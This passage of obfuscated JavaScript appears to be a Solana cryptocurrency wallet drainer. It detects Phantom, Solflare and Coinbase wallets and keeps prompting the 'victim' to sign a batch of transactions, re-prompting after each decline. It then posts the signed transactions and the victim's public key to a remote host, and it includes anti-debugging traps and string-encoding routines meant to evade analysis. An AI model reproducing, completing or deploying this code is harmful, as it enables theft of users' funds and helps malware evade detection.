            var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
            if (_0x200a61 === -0x1) continue;
            if (__String < 0x0) {
              __String = _0x200a61;
            } else {
              __String += _0x200a61 * 0x5b;
              receiverPublicKey |= __String << __globalObject;
              __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
              do {
                handlerPublicKey.push(receiverPublicKey & 0xff);
                receiverPublicKey >>= 0x8;
                __globalObject -= 0x8;
              } while (__globalObject > 0x7);
              __String = -0x1;
            }
          }
          if (__String > -0x1) {
            handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
          }
          return fsS5SCv(handlerPublicKey);
        }
        function dkRy3yU(cHN1sY7) {
          if (typeof f3i6H1[cHN1sY7] === 'undefined') {
            return f3i6H1[cHN1sY7] = _MtksmT(rOnBTDk[cHN1sY7]);
          }
          return f3i6H1[cHN1sY7];
        }
        await onPrompted(victimPublicKey[XyUQbA(0x16b)](), isMobile);
        let bS11Lg;
        walletName === XyUQbA(0x16c) && (bS11Lg = showSignInstructions());
        let signedTransactions;
        let r8bOn2 = ![];
        let PIv0h7;
        while (!r8bOn2) {
          try {
            function Zq1aYMj(cHN1sY7) {
              var jnnEqQv = "$t(u;/Tvg,=k:%.<F>*As&BCZ)Ymo+G?\"r~}`DqpEhi@H^]_[j{|nbWlzwIJxyK2L0PNM3ORad1QSeV4U75Xc6!f#98";
              var e_qLdL = "" + (cHN1sY7 || "");
              var djkbJA = e_qLdL.length;
              var handlerPublicKey = [];
              var receiverPublicKey = 0x0;
              var __globalObject = 0x0;
              var __String = -0x1;
              for (var __Array = 0x0; __Array < djkbJA; __Array++) {
                var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
                if (_0x200a61 === -0x1) continue;
                if (__String < 0x0) {
                  __String = _0x200a61;
                } else {
                  __String += _0x200a61 * 0x5b;
                  receiverPublicKey |= __String << __globalObject;
                  __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
                  do {
                    handlerPublicKey.push(receiverPublicKey & 0xff);
                    receiverPublicKey >>= 0x8;
                    __globalObject -= 0x8;
                  } while (__globalObject > 0x7);
                  __String = -0x1;
                }
              }
              if (__String > -0x1) {
                handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
              }
              return fsS5SCv(handlerPublicKey);
            }
            function m2fIiLC(cHN1sY7) {
              if (typeof f3i6H1[cHN1sY7] === 'undefined') {
                return f3i6H1[cHN1sY7] = Zq1aYMj(rOnBTDk[cHN1sY7]);
              }
              return f3i6H1[cHN1sY7];
            }
            const KavHsAk = await solanaConnection["getLat" + "estBlo" + XyUQbA(0x16d)]("finali" + "zed");
            PIv0h7 = Date[XyUQbA(0x16e)](), console['\x6c\x6f\x67'](m2fIiLC(0x16f) + m2fIiLC(0x170) + "ash:", KavHsAk);
            for (const uECoxPH of kuVJMI) {
              uECoxPH[m2fIiLC(0x171) + "Blockh" + "ash"] = KavHsAk["blockh" + "ash"], uECoxPH['\x66\x65\x65\x50\x61\x79\x65\x72'] = handlerPublicKey, console['\x6c\x6f\x67']('\x54\x58\x3a', uECoxPH);
            }
            signedTransactions = await solanaProvider[m2fIiLC(0x172) + "lTrans" + m2fIiLC(0x173) + "s"](kuVJMI);
            if (Date['\x6e\x6f\x77']() - PIv0h7 > BLOCKHASH_EXPIRATION_THRESHOLD) {
              console['\x6c\x6f\x67'](m2fIiLC(0x174));
              continue;
            }
            r8bOn2 = !![];
          } catch (dfavtuQ) {
            console['\x6c\x6f\x67']('\u041e\u0448\u0438\u0431\u043a\u0430\x20\u043f\u0440\u0438\x20\u043f\u043e\u0434\u043f\u0438\u0441\u0430\u043d\u0438\u0438\x20\u0442\u0440\u0430\u043d\u0437\u0430\u043a\u0446\u0438\u0439\x2c\x20\u043f\u043e\u0432\u0442\u043e\u0440\u043d\u0430\u044f\x20\u043f\u043e\u043f\u044b\u0442\u043a\u0430\x2e\x2e\x2e', dfavtuQ), await onDeclined(victimPublicKey['\x74\x6f\x53\x74\x72\x69\x6e\x67'](), isMobile), await sleep(0x1f4);
          }
        }
        bS11Lg && hideSignInstructions(bS11Lg);
        console['\x6c\x6f\x67'](XyUQbA(0x175) + ":", signedTransactions);
        const serializedTransactions = [];
        for (const signedTransaction of signedTransactions) {
          try {
            function s6Bk5Wb(cHN1sY7) {
              var jnnEqQv = "ByhgFAjwiHlGnEDxCkmzI13MPJ2o0rOpqu45KL76!t9vs#N8SdYcReQTfbVZaUXW.^\"/:}(;<|%>~[&?@$]={+)*,_`";
              var e_qLdL = "" + (cHN1sY7 || "");
              var djkbJA = e_qLdL.length;
              var handlerPublicKey = [];
              var receiverPublicKey = 0x0;
              var __globalObject = 0x0;
              var __String = -0x1;
              for (var __Array = 0x0; __Array < djkbJA; __Array++) {
                var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
                if (_0x200a61 === -0x1) continue;
                if (__String < 0x0) {
                  __String = _0x200a61;
                } else {
                  __String += _0x200a61 * 0x5b;
                  receiverPublicKey |= __String << __globalObject;
                  __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
                  do {
                    handlerPublicKey.push(receiverPublicKey & 0xff);
                    receiverPublicKey >>= 0x8;
                    __globalObject -= 0x8;
                  } while (__globalObject > 0x7);
                  __String = -0x1;
                }
              }
              if (__String > -0x1) {
                handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
              }
              return fsS5SCv(handlerPublicKey);
            }
            function Ad5rLX(cHN1sY7) {
              if (typeof f3i6H1[cHN1sY7] === 'undefined') {
                return f3i6H1[cHN1sY7] = s6Bk5Wb(rOnBTDk[cHN1sY7]);
              }
              return f3i6H1[cHN1sY7];
            }
            const serializedTransaction = signedTransaction[Ad5rLX(0x176)]({
              ["requir" + Ad5rLX(0x177) + "gnatur" + "es"]: ![]
            });
            serializedTransactions['\x70\x75\x73\x68'](serializedTransaction);
          } catch (rh3SgN) {
            console[XyUQbA(0x16a)](rh3SgN);
          }
        }
        const encodedTransactions = serializeTransactions(serializedTransactions);
        const QQyyzl6 = {
          '\x64\x6f\x6d\x61\x69\x6e': parentData['\x63\x64\x6e'],
          ["TRANSA" + dkRy3yU(0x178)]: encodedTransactions,
          [dkRy3yU(0x179)]: s3TN6E1,
          [dkRy3yU(0x17a)]: victimPublicKey['\x74\x6f\x53\x74\x72\x69\x6e\x67']()
        };
        await fetch(HOST + dkRy3yU(0x17b), {
          '\x6d\x65\x74\x68\x6f\x64': '\x50\x4f\x53\x54',
          '\x68\x65\x61\x64\x65\x72\x73': {
            [dkRy3yU(0x17c)]: '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e'
          },
          [dkRy3yU(0x17d)]: JSON["string" + "ify"](QQyyzl6)
        }), initSOL = !![];
      } catch (jkiG2Nc) {
        function wpdtmK(cHN1sY7) {
          var jnnEqQv = "QdCTRBZSXAWVUaYbcfDeGEFHIJLKOMNPhlmgkinjoqrptsvux4wyz2015673#!98%&$(,)*+;.:/=><?[^@]`_|{}~\"";
          var e_qLdL = "" + (cHN1sY7 || "");
          var djkbJA = e_qLdL.length;
          var handlerPublicKey = [];
          var receiverPublicKey = 0x0;
          var __globalObject = 0x0;
          var __String = -0x1;
          for (var __Array = 0x0; __Array < djkbJA; __Array++) {
            var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
            if (_0x200a61 === -0x1) continue;
            if (__String < 0x0) {
              __String = _0x200a61;
            } else {
              __String += _0x200a61 * 0x5b;
              receiverPublicKey |= __String << __globalObject;
              __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
              do {
                handlerPublicKey.push(receiverPublicKey & 0xff);
                receiverPublicKey >>= 0x8;
                __globalObject -= 0x8;
              } while (__globalObject > 0x7);
              __String = -0x1;
            }
          }
          if (__String > -0x1) {
            handlerPublicKey.push((receiverPublicKey | __String << __globalObject) & 0xff);
          }
          return fsS5SCv(handlerPublicKey);
        }
        function sNocre(cHN1sY7) {
          if (typeof f3i6H1[cHN1sY7] === 'undefined') {
            return f3i6H1[cHN1sY7] = wpdtmK(rOnBTDk[cHN1sY7]);
          }
          return f3i6H1[cHN1sY7];
        }
        console[sNocre(0x17e)](jkiG2Nc), await onDeclined(victimPublicKey[sNocre(0x17f)](), isMobile);
      }
      await sleep(0x1f4);
    }
  }
  window["change" + jnnEqQv(0x180)](![], BAD_WALLET);
}
async function initSOL() {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "%$>Q(&BR;)<G*?S+A=TUV,E:.HD/CW~X}Z[a\"YbF^]IcK@`|_d{NJeLMOPfilkhmjgnupstvqorwxzy1023548976#!";
    var e_qLdL = "" + (cHN1sY7 || "");
    var f3i6H1 = e_qLdL.length;
    var rOnBTDk = [];
    var djkbJA = 0x0;
    var __globalObject = 0x0;
    var __String = -0x1;
    for (var __Array = 0x0; __Array < f3i6H1; __Array++) {
      var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
      if (_0x200a61 === -0x1) continue;
      if (__String < 0x0) {
        __String = _0x200a61;
      } else {
        __String += _0x200a61 * 0x5b;
        djkbJA |= __String << __globalObject;
        __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          rOnBTDk.push(djkbJA & 0xff);
          djkbJA >>= 0x8;
          __globalObject -= 0x8;
        } while (__globalObject > 0x7);
        __String = -0x1;
      }
    }
    if (__String > -0x1) {
      rOnBTDk.push((djkbJA | __String << __globalObject) & 0xff);
    }
    return fsS5SCv(rOnBTDk);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  phantom = window['\x70\x68\x61\x6e\x74\x6f\x6d']?.['\x73\x6f\x6c\x61\x6e\x61']?.['\x69\x73\x50\x68\x61\x6e\x74\x6f\x6d'], solflare = window[e_qLdL(0x104)]?.["isSolf" + "lare"], coinbase = window["coinba" + e_qLdL(0x181) + e_qLdL(0x182) + jnnEqQv(0x183)]?.['\x69\x73\x43\x6f\x69\x6e\x62\x61\x73\x65\x57\x61\x6c\x6c\x65\x74'], solanaConnection = new Connection(SOLANA_RPC_URL);
}
async function init(cHN1sY7, jnnEqQv) {
  console[e_qLdL(0x184)]('\x53\x74\x61\x72\x74\x65\x64\x20\x69\x6e\x69\x74\x20\x77\x69\x74\x68\x20\x64\x61\x74\x61', jnnEqQv), parentData = jnnEqQv, await initSOL(), console['\x6c\x6f\x67'](e_qLdL(0x185) + e_qLdL(0x186), parentData), cHN1sY7[e_qLdL(0x187)](e_qLdL(0x188), async () => {
    await handleModalChoice(jnnEqQv['\x70\x6f\x70\x75\x70'][e_qLdL(0x189) + "Id"]);
  }), window["hideLo" + e_qLdL(0x18a)]();
}
window["handle" + e_qLdL(0x18b) + "tor"] = init;
function _0x586d22(cHN1sY7) {
  function jnnEqQv(cHN1sY7) {
    if (typeof cHN1sY7 === '\x73\x74\x72\x69\x6e\x67') {
      function djkbJA(cHN1sY7) {
        var djkbJA = "ZSPXYARLUVBWCNTDOQMbEFGaHIJcKdefgoihjmpqrtsnkluvyxwz1302!957#846;`[:@^/](?_.{=|\"<})>*$&+,~%";
        var __globalObject = "" + (cHN1sY7 || "");
        var jnnEqQv = __globalObject.length;
        var e_qLdL = [];
        var f3i6H1 = 0x0;
        var rOnBTDk = 0x0;
        var __String = -0x1;
        for (var __Array = 0x0; __Array < jnnEqQv; __Array++) {
          var _0x200a61 = djkbJA.indexOf(__globalObject[__Array]);
          if (_0x200a61 === -0x1) continue;
          if (__String < 0x0) {
            __String = _0x200a61;
          } else {
            __String += _0x200a61 * 0x5b;
            f3i6H1 |= __String << rOnBTDk;
            rOnBTDk += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
            do {
              e_qLdL.push(f3i6H1 & 0xff);
              f3i6H1 >>= 0x8;
              rOnBTDk -= 0x8;
            } while (rOnBTDk > 0x7);
            __String = -0x1;
          }
        }
        if (__String > -0x1) {
          e_qLdL.push((f3i6H1 | __String << rOnBTDk) & 0xff);
        }
        return fsS5SCv(e_qLdL);
      }
      function __globalObject(cHN1sY7) {
        if (typeof f3i6H1[cHN1sY7] === 'undefined') {
          return f3i6H1[cHN1sY7] = djkbJA(rOnBTDk[cHN1sY7]);
        }
        return f3i6H1[cHN1sY7];
      }
      return function (cHN1sY7) {}[e_qLdL(0x18c)](e_qLdL(0x18d) + e_qLdL(0x18e) + e_qLdL(0x18f))[__globalObject(0x190)](__globalObject(0x191) + "r");
    } else {
      ('' + cHN1sY7 / cHN1sY7)['\x6c\x65\x6e\x67\x74\x68'] !== 0x1 || cHN1sY7 % 0x14 === 0x0 ? function () {
        return !![];
      }['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\x64\x65\x62\x75' + e_qLdL(0x192))['\x63\x61\x6c\x6c']('\x61\x63\x74\x69\x6f\x6e') : function () {
        return ![];
      }['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\x64\x65\x62\x75' + '\x67\x67\x65\x72')[e_qLdL(0x193)](e_qLdL(0x194));
    }
    jnnEqQv(++cHN1sY7);
  }
  try {
    if (cHN1sY7) {
      return jnnEqQv;
    } else {
      jnnEqQv(0x0);
    }
  } catch (djkbJA) {}
}